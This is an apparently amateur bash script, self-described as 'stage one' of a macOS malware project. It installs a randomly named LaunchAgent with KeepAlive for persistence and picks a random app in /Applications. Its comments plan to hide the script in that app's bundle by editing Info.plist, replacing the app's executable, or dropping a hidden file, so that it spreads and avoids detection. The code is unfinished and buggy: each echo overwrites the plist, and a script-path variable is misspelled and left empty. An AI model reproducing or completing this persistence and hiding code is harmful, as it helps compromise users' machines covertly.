#!/bin/bash
#This script is stage one of lol, limewire. I have no idea how many stages will exist in total
#
#
#Sites that I used or looked at, for future reference, if I ever look back and have no idea what I did or something like that
#
#https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html
#https://www.launchd.info/
#https://stackoverflow.com/questions/35623462/bash-select-random-string-from-list
#https://linuxconfig.org/how-to-use-arrays-in-bash-script
#https://stackoverflow.com/questions/34823263/how-to-pass-a-variable-to-the-mv-command-to-rename-a-file-text-with-spaces-and-t#34823319
#https://stackoverflow.com/questions/13210880/replace-one-substring-for-another-string-in-shell-script#13210909
#
#
#Variables for the LaunchAgent (this system may be abolished in the future)
VONE=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 3 | head -n 1)
#Randomly generated, except the amount of characters will vary (may not work)
VTWO=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 256 | head -n 1 | sed -e 's/^0*//' | head --bytes 9)
if [ "$VTWO" == "" ]; then
  VTWO=a
fi
VTHREE=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 256 | head -n 1 | sed -e 's/^0*//' | head --bytes 9)
if [ "$VTHREE" == "" ]; then
  VTHREE=a
fi
LABEL="$VONE.$VTWO.$VTHREE"

#We need a dir for hiding this/the/a script which everyone can read and write to/from (without SIP disabled 
#or sudo perms). The directory /Applications/ is a good fit for this. 
#There will be two types of applications/folders that will be present: ones that require sudo to modify, and
#ones that won't. I've come up with three ways to hide the/this/a script, each with upsides and downsides:
#[1] Changing the app's Info.plist to launch the script, which will be a . file in the MacOS dir of the app
#[2] Renaming the app's executable and copying the script to where the executable was
#[3] Just hiding the script as a hidden file somewhere in the app's dir
#For solution number one and two, the script will launch the app's (actual) executable sometime while running,
#but since we don't want the app's executable to launch when the LaunchAgent is run, the script and plist will
#have to have an argument (-no) which will prevent the running of the executable. This is all doable, and will
#probably spread/be run more often than solution three, especially if the app is a commonly used one.
#For solution number three, the script will only run on login or startup (not sure which), meaning that it'll 
#likely be spread more slowly/ran less often, but may be less likely to be found/detected.
#All three solutions will work, and maybe be used depending on what protection the app has.
#
#Application roulette - array creation and selection (may not work) (specifically lines (excl.#s) 1, 4, 5, 6)
array=$(ls /Applications/)
size=${#array[@]}
index=$(($RANDOM % $size))
APPDIR="/Applications/${array[$index]}"
#Need to check if there's more than one file in the MacOS folder
#Also need to check if the/this/a script already exists in the folder
EXENAME=$(ls ${APPDIR}/Contents/MacOS/)
EXEPATH="${APPDIR}/Contents/MacOS/${EXENAME}"
#This an important variable: where in the .app dir the/this/a script is:
SCRIPTPATH=""


#LaunchAgent creation:
#If this doesn't work, it can be transitiond to printf (w/ /n)
#The touch is probably unneccesary
touch "/Library/LaunchAgents/${LABEL}.plist"
echo "<?xml version="1.0" encoding="UTF-8"?>" > "/Library/LaunchAgents/${LABEL}.plist"
echo "<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">" > "/Library/LaunchAgents/${LABEL}.plist"
echo "<plist version="1.0">" > "/Library/LaunchAgents/${LABEL}.plist"
echo "<dict>" > "/Library/LaunchAgents/${LABEL}.plist"
echo "    <key>Label</key>" > "/Library/LaunchAgents/${LABEL}.plist"
echo "    <string>$LABEL</string>" > "/Library/LaunchAgents/${LABEL}.plist"
echo "    <key>Program</key>" > "/Library/LaunchAgents/${LABEL}.plist"
echo "    <string>${APPDIR}${SPRIPTPATH}</string>" > "/Library/LaunchAgents/${LABEL}.plist"
echo "    <key>ProgramArguments</key>" > "/Library/LaunchAgents/${LABEL}.plist"
echo "    <array>" > "/Library/LaunchAgents/${LABEL}.plist"
echo "        <string>-no</string>" > "/Library/LaunchAgents/${LABEL}.plist"
echo "    </array>" > "/Library/LaunchAgents/${LABEL}.plist"
echo "    <key>KeepAlive</key>" > "/Library/LaunchAgents/${LABEL}.plist"
echo "    <true/>" > "/Library/LaunchAgents/${LABEL}.plist"
echo "</dict>" > "/Library/LaunchAgents/${LABEL}.plist"
echo "</plist>" > "/Library/LaunchAgents/${LABEL}.plist"
